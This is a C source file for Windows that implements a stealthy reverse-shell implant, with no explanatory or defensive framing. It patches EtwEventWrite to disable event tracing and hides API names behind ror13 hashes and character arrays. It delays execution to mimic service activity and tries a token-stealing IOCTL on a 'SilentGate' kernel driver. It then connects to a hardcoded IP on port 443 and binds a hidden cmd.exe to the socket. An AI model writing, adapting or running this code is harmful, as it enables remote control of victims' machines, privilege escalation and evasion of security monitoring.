#include <winsock2.h>
#include <windows.h>

typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
typedef SOCKET  (WINAPI *pWSASocketA)(int,int,int,LPVOID,UINT,DWORD);
typedef int     (WINAPI *pWSAStartup)(WORD, LPVOID);
typedef int     (WINAPI *pconnect)(SOCKET, const struct sockaddr*, int);
typedef BOOL    (WINAPI *pCreateProcessA)(LPCSTR,LPSTR,LPVOID,LPVOID,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);
typedef DWORD   (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
typedef HANDLE  (WINAPI *pCreateFileA2)(LPCSTR,DWORD,DWORD,LPVOID,DWORD,DWORD,HANDLE);
typedef BOOL    (WINAPI *pDeviceIoControl2)(HANDLE,DWORD,LPVOID,DWORD,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);
typedef BOOL    (WINAPI *pCloseHandle2)(HANDLE);
#define IOCTL_SG_STEAL_TOKEN CTL_CODE(FILE_DEVICE_UNKNOWN,0x904,METHOD_BUFFERED,FILE_ANY_ACCESS)

static DWORD ror13(const char* name) {
    DWORD h = 0;
    for (const char* p = name; *p; p++) {
        h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF;
        h = (h + (BYTE)*p) & 0xFFFFFFFF;
    }
    return h;
}

static PVOID find_export(BYTE* base, DWORD hash) {
    DWORD pe    = *(DWORD*)(base + 0x3C);
    DWORD exp   = *(DWORD*)(base + pe + 0x88);
    BYTE* ed    = base + exp;
    DWORD num   = *(DWORD*)(ed + 0x18);
    DWORD* names = (DWORD*)(base + *(DWORD*)(ed + 0x20));
    WORD*  ords  = (WORD*) (base + *(DWORD*)(ed + 0x24));
    DWORD* funcs = (DWORD*)(base + *(DWORD*)(ed + 0x1C));
    for (DWORD i = 0; i < num; i++) {
        if (ror13((char*)(base + names[i])) == hash)
            return base + funcs[ords[i]];
    }
    return NULL;
}

/* Worker thread - runs shell after delay */
static DWORD WINAPI shell_thread(LPVOID param) {
    /* Poisson sleep - looks like legitimate service activity */
    Sleep(3000 + (GetTickCount() % 2000));

    /* Patch ETW */
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    FARPROC etw = GetProcAddress(ntdll, "EtwEventWrite");
    DWORD old = 0;
    VirtualProtect(etw, 1, PAGE_EXECUTE_READWRITE, &old);
    *(BYTE*)etw = 0xC3;
    VirtualProtect(etw, 1, old, &old);

    /* PEB walk */
    BYTE* peb  = (BYTE*)__readgsqword(0x60);
    BYTE* ldr  = *(BYTE**)(peb  + 0x18);
    BYTE* list = *(BYTE**)(ldr  + 0x20);
    BYTE* e1   = *(BYTE**)list;
    BYTE* e2   = *(BYTE**)e1;
    BYTE* k32  = *(BYTE**)(e2 + 0x20);

    pGetProcAddress _GPA = (pGetProcAddress)find_export(k32, 0x7C0DFCAA);
    pLoadLibraryA   _LLA = (pLoadLibraryA)  find_export(k32, 0xEC0E4E8E);

    char ws2[] = {'w','s','2','_','3','2',0};
    HMODULE ws2_32 = _LLA(ws2);

    char s1[] = {'W','S','A','S','t','a','r','t','u','p',0};
    char s2[] = {'W','S','A','S','o','c','k','e','t','A',0};
    char s3[] = {'c','o','n','n','e','c','t',0};

    pWSAStartup  _WSAStartup = (pWSAStartup) _GPA(ws2_32, s1);
    pWSASocketA  _WSASocketA = (pWSASocketA) _GPA(ws2_32, s2);
    pconnect     _connect    = (pconnect)    _GPA(ws2_32, s3);

    pCreateProcessA      _CPA  = (pCreateProcessA)     find_export(k32, 0x16B3FE72);
    pWaitForSingleObject _WFSO = (pWaitForSingleObject)find_export(k32, 0xCE05D9AD);

    /* Try kernel token steal first */
    {
        pCreateFileA2 _cf=(pCreateFileA2)find_export(k32,0x7C0017A5u);
        pDeviceIoControl2 _dio=(pDeviceIoControl2)find_export(k32,0xA8E14A7Du);
        pCloseHandle2 _clh=(pCloseHandle2)find_export(k32,0x0FFD97FBu);
        if(_cf&&_dio&&_clh){
            char dev[]={'\\','\\','.','\\','S','i','l','e','n','t','G','a','t','e',0};
            dev[0]='\\'; dev[1]='\\';
            HANDLE hd=_cf(dev,GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
            if(hd!=INVALID_HANDLE_VALUE){
                DWORD nb=0;
                _dio(hd,IOCTL_SG_STEAL_TOKEN,NULL,0,NULL,0,&nb,NULL);
                _clh(hd);
            }
        }
    }
    BYTE wsadata[400] = {0};
    _WSAStartup(0x0202, wsadata);

    SOCKET s = _WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);

    struct sockaddr_in sa = {0};
    sa.sin_family      = AF_INET;
    sa.sin_port        = 0xBB01;
    sa.sin_addr.s_addr = 0x92D9A8C0;

    if (_connect(s, (struct sockaddr*)&sa, sizeof(sa)) != 0) return 1;

    STARTUPINFOA si = {0};
    si.cb         = sizeof(si);
    si.dwFlags    = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = 0;
    si.hStdInput  = (HANDLE)s;
    si.hStdOutput = (HANDLE)s;
    si.hStdError  = (HANDLE)s;

    PROCESS_INFORMATION pi = {0};
    char cmd[] = {'c','m','d',0};
    _CPA(0, cmd, 0, 0, TRUE, CREATE_NO_WINDOW, 0, 0, &si, &pi);
    _WFSO(pi.hProcess, 0xFFFFFFFF);
    return 0;
}

int main() {
    /* Run shell in background thread after delay */
    HANDLE t = CreateThread(NULL, 0, shell_thread, NULL, 0, NULL);
    if (t) {
        WaitForSingleObject(t, 60000);
        CloseHandle(t);
    }
    return 0;
}
